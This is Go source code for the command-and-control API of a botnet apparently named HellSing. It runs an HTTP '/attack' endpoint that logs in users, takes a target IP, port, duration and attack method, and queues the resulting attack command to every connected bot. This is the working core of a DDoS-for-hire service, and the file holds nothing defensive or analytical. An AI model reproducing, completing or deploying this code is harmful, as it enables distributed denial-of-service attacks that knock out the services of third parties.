package cnc

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strconv"

	"HellSing/cnc/api"

	"github.com/gorilla/mux"
)

func ListenAPI() {
	mux := mux.NewRouter()
	mux.NotFoundHandler = http.HandlerFunc(api.NotFound)
	mux.MethodNotAllowedHandler = http.HandlerFunc(api.NotAllowed)
	mux.HandleFunc("/attack", attackHandler)
	log.Fatal(http.ListenAndServe(":9999", mux))
}

type AutoGenerated struct {
	Credits string `json:"credits"`
	Info    struct {
		Clients  int    `json:"clients"`
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Duration int    `json:"duration"`
	} `json:"info"`
	Error struct {
		Message string `json:"message"`
		Error   bool   `json:"error"`
	} `json:"error"`
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	Query := r.URL.Query()
	user := Query["user"]
	pass := Query["pass"]
	host := Query["target"]
	port := Query["port"]
	dura := Query["time"]
	method := Query["method"]
	valid, info := Db.TryLogin(user[0], pass[0])
	if !valid {
		return
	}
	portint, err := strconv.Atoi(port[0])
	if err != nil {
		return
	}
	if portint < 0 || portint >= 65535 {
		return
	}
	duration, err := strconv.Atoi(dura[0])
	if err != nil {
		return
	}
	if net.ParseIP(host[0]) == nil {
		return
	}
	cmd := fmt.Sprintf(".%s %s %d dport=%d", method[0], host[0], duration, portint)
	atk, err := NewAttack(cmd, info.admin)
	if err != nil {
		json.NewEncoder(w).Encode(&AutoGenerated{Credits: "@pazdano.sh, @Jacck", Info: struct {
			Clients  int    "json:\"clients\""
			Target   string "json:\"target\""
			Port     int    "json:\"port\""
			Duration int    "json:\"duration\""
		}{Clients: Clist.Count(), Target: host[0], Port: portint, Duration: duration}, Error: struct {
			Message string "json:\"message\""
			Error   bool   "json:\"error\""
		}{Message: err.Error(), Error: true}})
		return
	} else {
		buf, err := atk.Build()
		if err != nil {
			json.NewEncoder(w).Encode(&AutoGenerated{Credits: "@pazdano.sh, @Jacck", Info: struct {
				Clients  int    "json:\"clients\""
				Target   string "json:\"target\""
				Port     int    "json:\"port\""
				Duration int    "json:\"duration\""
			}{Clients: Clist.Count(), Target: host[0], Port: portint, Duration: duration}, Error: struct {
				Message string "json:\"message\""
				Error   bool   "json:\"error\""
			}{Message: err.Error(), Error: true}})
			return
		}
		if can, err := Db.CanLaunchAttack(info.username, atk.Duration, cmd, Clist.count, 0); !can {
			json.NewEncoder(w).Encode(&AutoGenerated{Credits: "@pazdano.sh, @Jacck", Info: struct {
				Clients  int    "json:\"clients\""
				Target   string "json:\"target\""
				Port     int    "json:\"port\""
				Duration int    "json:\"duration\""
			}{Clients: Clist.Count(), Target: host[0], Port: portint, Duration: duration}, Error: struct {
				Message string "json:\"message\""
				Error   bool   "json:\"error\""
			}{Message: err.Error(), Error: true}})
		} else if !Db.ContainsWhitelistedTargets(atk) {
			Clist.QueueBuf(buf, Clist.count, "")
		}
	}
	json.NewEncoder(w).Encode(&AutoGenerated{Credits: "@pazdano.sh, @Jacck", Info: struct {
		Clients  int    "json:\"clients\""
		Target   string "json:\"target\""
		Port     int    "json:\"port\""
		Duration int    "json:\"duration\""
	}{Clients: Clist.Count(), Target: host[0], Port: portint, Duration: duration}, Error: struct {
		Message string "json:\"message\""
		Error   bool   "json:\"error\""
	}{Message: err.Error(), Error: false}})

}
